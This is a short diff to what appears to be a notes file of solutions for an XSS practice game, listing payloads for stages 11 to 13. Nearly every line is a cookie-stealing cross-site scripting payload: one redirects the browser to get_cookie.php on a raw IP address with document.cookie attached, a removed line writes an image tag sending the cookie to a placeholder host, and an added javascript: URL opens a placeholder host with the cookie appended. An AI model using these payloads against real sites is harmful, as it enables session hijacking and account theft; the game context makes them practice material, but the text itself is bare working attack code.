@@ -27,8 +27,8 @@ stage11:
 http://38e585f94f9d1f6bb79e88b74f3a5b5871d5bb84.knock.xss.moe/?q=javascript%3Adocument.location.href%3D%22http%3A%2f%2f118.69.135.163%2fget_cookie.php%3Fcookie%22%2bdocument.cookie%3B
 
 stage12:
-<iframe src="XSS"></iframe>
-document.write('<img src="//xxx/get_cookie.php?cookie=' + document.cookie + '" />')
+
+javascript:window.open(`http://xxxx/?x=`+document.cookie)
 
 
 stage13:
